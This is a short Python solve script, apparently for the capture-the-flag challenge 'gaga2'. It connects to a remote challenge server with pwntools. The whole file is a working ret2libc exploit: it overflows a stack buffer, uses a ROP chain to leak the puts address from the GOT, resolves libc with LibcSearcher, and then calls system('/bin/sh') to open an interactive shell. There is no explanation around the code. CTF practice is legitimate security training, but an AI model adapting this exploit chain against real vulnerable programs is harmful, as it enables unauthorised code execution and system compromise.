from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('./gaga2')

# p = process('./gaga2')
p = remote('challs.actf.co', '31302')
pause()

pop_rdi_ret = 0x00000000004012b3
start_addr = 0x004010f0

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    start_addr
)
p.sendlineafter(b'Your input: ', payload)

put_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
libc = LibcSearcher('puts', put_addr)
libc_base = put_addr - libc.dump('puts')
system_addr = libc.dump('system') + libc_base
bin_sh_addr = libc.dump('str_bin_sh') + libc_base

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    bin_sh_addr,
    system_addr
)
p.sendlineafter(b'Your input: ', payload)

p.interactive()